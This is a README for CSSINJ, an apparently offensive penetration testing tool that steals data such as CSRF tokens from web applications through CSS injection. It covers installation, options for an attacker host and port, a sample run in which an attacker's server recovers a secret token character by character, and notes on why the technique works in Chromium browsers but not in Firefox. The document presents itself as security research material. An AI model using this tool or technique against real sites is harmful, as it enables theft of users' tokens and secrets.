---

# CSSINJ  

```
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
```

## About  

**CSSINJ** is a penetration testing tool that exploits [**CSS injection vulnerabilities**](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection) to exfiltrate sensitive information from web applications. This tool is designed for security professionals to assess the security posture of web applications by demonstrating how CSS can be used to extract data covertly.  


## Installation  

To install and set up **CSSINJ**, run the following commands:  

```bash
git clone https://github.com/DonAsako/CSSinj.git
cd CSSinj
python3 -m venv venv  
source venv/bin/activate
python3 -m pip install -r requirements.txt
```

Now you’re ready to use **CSSINJ**! 🎯  

## Usage  

```bash
python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER
```

### Options  

| Option                 | Description                                 |
|------------------------|---------------------------------------------|
| `-h, --help`           | Show help message and exit                  |
| `-H, --hostname`       | Attacker hostname or IP address             |
| `-p, --port`           | Port number of the attacker                 |
| `-i, --identifier`     | CSS identifier (CSS selector) to extract data |

### Example  

```bash
~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -i input.csrf
  _____   _____   _____  _____  _   _       _     _____  __     __
 / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
 \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|

[✓] Attacker's server started on 127.0.0.1:5005
======== Running on http://0.0.0.0:5005 ========
(Press CTRL+C to quit)
[✓] Connection from ::1
[ⓘ] Token is M
[ⓘ] Token is My
[ⓘ] Token is MyS
...
[✓] The token is : MySecreteValue
```

## Browser-Specific Behavior

The success of CSS injection attacks using @import depends on the browser's handling of CSS imports:
- Chromium-based browsers (Chrome, Edge, Brave, etc.) allow recursive CSS imports and will process the injected styles, making them vulnerable to exfiltration techniques using @import.

- Firefox, however, handles @import differently:
  - Unlike Chromium-based browsers, Firefox processes all @import rules before applying any styles.
  - As a result, the attack fails because the browser never processes the CSS selectors, preventing data exfiltration.
  - This behavior causes an infinite loop where the browser keeps waiting for a CSS update that never happens.

This difference in behavior makes Chromium-based browsers more susceptible to CSS injection exfiltration, while Firefox provides better protection against such attacks.

## Todo
- [ ] Add injection parameters
- [ ] Implement automatic detection of CSS injection vulnerabilities
- [ ] Add an option to save results to a file
- [ ] Add custom payload
- [ ] Allow multiple CSS selectors for simultaneous extraction

## Disclaimer  

This tool is intended **only for ethical hacking and security research**. **Unauthorized use on systems without explicit permission is illegal**. The developer **is not responsible** for any misuse of this tool.  

## Author  

**CSSINJ** was developed by **Asako**.  
